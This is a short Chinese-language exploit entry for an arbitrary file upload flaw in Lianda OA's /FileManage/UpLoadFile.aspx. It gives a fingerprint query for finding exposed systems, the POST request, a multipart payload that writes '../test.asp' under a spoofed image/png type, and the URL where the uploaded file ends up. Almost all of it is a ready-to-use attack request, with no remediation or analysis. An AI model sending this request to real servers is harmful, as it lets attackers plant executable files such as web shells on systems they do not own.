# 联达OA-UpLoadFile.aspx存在任意文件上传漏洞

联达 ｜ 文件上传 ｜ —
- **指纹**：`app="联达OA"`
- **请求**：`POST /FileManage/UpLoadFile.aspx HTTP/1.1`

**Payload**
```
--00content0boundary00
Content-Disposition: form-data; name="DesignId"
1
--00content0boundary00
Content-Disposition: form-data; name="file"; filename="../test.asp"
Content-Type: image/png
test
--00content0boundary00--
http://ip/FileManage/test.asp
```